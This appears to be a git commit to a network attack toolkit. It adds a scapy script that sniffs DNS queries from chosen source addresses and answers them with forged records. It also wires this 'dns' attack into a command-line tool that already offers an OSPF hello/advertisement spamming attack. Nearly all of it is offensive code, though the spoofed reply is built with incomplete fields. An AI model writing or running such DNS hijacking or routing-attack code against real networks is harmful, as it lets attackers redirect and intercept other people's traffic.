145fc568d37bd9926e2d3e03db01590e848ad0fc
George <george.neokq@gmail.com>
2022-06-15 09:55:01 +0800

    feat: DNS hijacking

---
+++ dns_hijack.py
@@ -0,0 +1,45 @@
+from scapy.all import *
+from scapy.layers.dns import *
+from netaddr import IPNetwork
+
+TEST_MAPPING = {
+  "10.33.1.3": "8.8.8.8"
+}
+
+def intercept_dns(intercept_map: dict):
+  """
+  Intercept DNS requests, given a dict where
+  {
+    <CIDR address>: <DNS answer IP>,
+    ...
+  }
+
+  Parameters
+  -----------
+  intercept_map: dict
+    Dictionary mapping of network address in CIDR notation, to an IP address to answer with.
+    If the key is a single IP address instead of a range, it can be specified without /32 prefix.
+  """
+  answer_map = {}
+  print('Mapping:')
+  for [network, answer_ip] in intercept_map.items():
+    # "Unpack" the IP addresses in the range and create a more specific mapping
+    # for every host in the range
+    print(f'{network} -> {answer_ip}')
+    for host in IPNetwork(network).iter_hosts():
+      answer_map[str(host)] = answer_ip
+  
+  def intercept(packet: Packet):
+    if packet.haslayer('DNS') and answer_map.get(packet['IP'].src):
+      origin_src = packet['IP'].src
+      dns: DNS = packet['DNS']
+      requested_domain = dns.qd.qname
+      reply_packet = IP(dst='127.0.0.1') / UDP() / DNS(an=DNSRR(rrname=requested_domain, rdata=answer_map[origin_src]))
+      send(reply_packet)
+
+
+  # Sniff for DNS packets and answer accordingly
+  sniff(prn=intercept)
+
+if __name__ == '__main__':
+  intercept_dns(TEST_MAPPING)
--- main.py
+++ main.py
@@ -1,23 +1,42 @@
 import argparse
 from ospf_hijack import *
+from dns_hijack import *
 
 def main():
   parser = argparse.ArgumentParser()
   subparsers = parser.add_subparsers(dest='attack')
   subparsers.required = True
+  
   ospf_subparser = subparsers.add_parser('ospf')
   ospf_subparser.add_argument('--networks',
-      nargs='+',
-      type=str,
-      action='store',
-      help="Space-separated network addresses in CIDR notation",
-      required=True)
+    nargs='+',
+    type=str,
+    action='store',
+    help="Space-separated network addresses in CIDR notation",
+    required=True)
+
+  dns_subparser = subparsers.add_parser('dns')
+  dns_subparser.add_argument('--map',
+    nargs='+',
+    type=str,
+    action='store',
+    help="Space separated mappings, each key-value being colon-separated",
+    required=True
+  )
 
   args = parser.parse_args()
   attack = args.attack
 
   if attack == 'ospf':
-      spam_hello_and_advertisements(networks=args.networks)
+    spam_hello_and_advertisements(networks=args.networks)
+  
+  if attack == 'dns':
+    separator = ':'
+    mapping_dict = {}
+    for mapping in args.map:
+      [network_address, answer_ip] = mapping.split(separator)
+      mapping_dict[network_address] = answer_ip
+    intercept_dns(mapping_dict)
     
 
 if __name__ == '__main__':
